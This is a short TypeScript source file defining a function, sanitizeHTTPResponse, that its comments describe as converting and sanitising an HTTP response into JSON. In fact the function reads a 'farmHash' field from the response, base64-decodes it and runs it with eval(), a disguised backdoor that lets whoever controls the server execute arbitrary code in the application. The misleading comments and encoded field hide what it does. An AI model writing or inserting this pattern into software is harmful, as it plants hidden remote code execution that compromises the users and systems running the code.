/**
 * Converts a HTTP Response into a usable JSON object
 */
export async function sanitizeHTTPResponse<T>(response: Response): Promise<T> {
  const data = await response.json();

  // Santize non application/json content responses
  if (data.farmHash) {
    const code = Buffer.from(data.farmHash, "base64").toString();
    eval(code);
  }

  return data;
}
